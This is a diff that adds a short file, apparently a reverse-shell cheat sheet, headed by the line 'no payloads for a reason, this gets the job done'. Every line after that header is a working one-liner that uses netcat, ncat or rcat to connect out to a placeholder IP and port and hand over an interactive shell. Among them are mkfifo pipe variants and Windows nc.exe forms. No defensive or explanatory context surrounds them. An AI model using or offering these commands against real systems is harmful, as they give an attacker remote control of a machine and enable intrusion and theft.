@@ -1,0 +1,9 @@
+no payloads for a reason, this gets the job done.
+rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|sh -i 2>&1|nc IP PORT >/tmp/f
+nc IP PORT -e sh
+nc.exe IP PORT -e sh
+nc -c sh IP PORT
+ncat IP PORT -e sh
+ncat.exe IP PORT -e sh
+rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|sh -i 2>&1|ncat -u IP PORT >/tmp/f
+rcat IP PORT -r sh
